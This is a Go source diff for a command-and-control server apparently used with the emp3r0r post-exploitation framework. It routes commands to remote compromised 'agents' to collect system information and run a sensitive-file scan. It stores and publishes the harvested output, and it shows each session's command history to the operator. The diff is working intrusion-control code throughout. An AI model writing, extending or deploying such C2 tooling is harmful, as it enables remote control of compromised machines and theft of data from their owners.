@@ -635,6 +635,47 @@ func (s *Server) c2xCollectRun(ctx context.Context, agent, kind string, isWin bo
 	} else {
 		sb.WriteString("===== 敏感文件扫描 =====\n\n")
 	}
+	// 融合路由：emp3r0r 会话的命令组经 bridge 执行（run_module exec）。
+	if strings.HasPrefix(agent, emp3r0rIDPrefix) && emp3r0rEnabled() {
+		tag := strings.TrimPrefix(agent, emp3r0rIDPrefix)
+		for _, c := range cmds {
+			out, err := emp3r0rRunWait(ctx, tag, c, 90*time.Second)
+			if err != nil {
+				if kind == "sysinfo" {
+					sb.WriteString(fmt.Sprintf("--- %s ---\n[错误] %s\n\n", c, err.Error()))
+				}
+				continue
+			}
+			if strings.TrimSpace(out) != "" {
+				sb.WriteString(fmt.Sprintf("--- %s ---\n%s\n\n", c, out))
+			}
+		}
+		snap := classicSnap{
+			ID:          time.Now().Unix(),
+			Content:     sb.String(),
+			CollectedAt: time.Now().Format(time.RFC3339),
+		}
+		c2x.mu.Lock()
+		if kind == "sysinfo" {
+			c2x.sysinfo[agent] = snap
+			c2x.siSeq[agent] = append([]classicSnap{snap}, c2x.siSeq[agent]...)
+			if len(c2x.siSeq[agent]) > 10 {
+				c2x.siSeq[agent] = c2x.siSeq[agent][:10]
+			}
+		} else {
+			c2x.sensitive[agent] = snap
+			c2x.seSeq[agent] = append([]classicSnap{snap}, c2x.seSeq[agent]...)
+			if len(c2x.seSeq[agent]) > 10 {
+				c2x.seSeq[agent] = c2x.seSeq[agent][:10]
+			}
+		}
+		c2x.mu.Unlock()
+		c2xHub.publish(kind, map[string]any{
+			"agent_id": agent, "content": snap.Content, "collected_at": snap.CollectedAt, "id": snap.ID,
+		})
+		s.c2Audit(agent, "", kind+"_collect", "classic")
+		return
+	}
 	cli := c2Client()
 	for _, c := range cmds {
 		out, err := c2RunTaskWait(ctx, cli, agent, "exec", map[string]any{"cmd": c}, 90*time.Second)
@@ -676,6 +717,40 @@ func (s *Server) c2xCollectRun(ctx context.Context, agent, kind string, isWin bo
 
 func (s *Server) c2xMessages(w http.ResponseWriter, r *http.Request) {
 	id := r.PathValue("id")
+	// 融合视图：emp3r0r 会话的命令历史从任务快照取（goc2 会话走原路径）。
+	if strings.HasPrefix(id, emp3r0rIDPrefix) {
+		msgs := []map[string]any{}
+		cmdHist := map[string]string{}
+		for _, ti := range emp3r0rAllTasks() {
+			tm, _ := ti.(map[string]any)
+			if tm == nil {
+				continue
+			}
+			if cid, _ := tm["client_id"].(string); cid != id {
+				continue
+			}
+			tid, _ := tm["id"].(string)
+			args, _ := tm["args"].(map[string]any)
+			cmdStr, _ := args["cmd"].(string)
+			if cmdStr == "" {
+				continue
+			}
+			created, _ := tm["createdAt"].(string)
+			out, _ := tm["output"].(string)
+			errs, _ := tm["error"].(string)
+			cmdHist[tid] = cmdStr
+			msgs = append(msgs, map[string]any{
+				"is_command": true, "content": cmdStr, "command_id": tid, "timestamp": created,
+			})
+			if out != "" || errs != "" {
+				msgs = append(msgs, map[string]any{
+					"is_command": false, "content": out, "response_to": tid, "timestamp": created,
+				})
+			}
+		}
+		writeJSON(w, 200, map[string]any{"messages": msgs, "command_history": cmdHist})
+		return
+	}
 	tasks, err := c2Client().ListTasks(r.Context(), id, nil)
 	if err != nil {
 		writeErr(w, 502, err.Error())
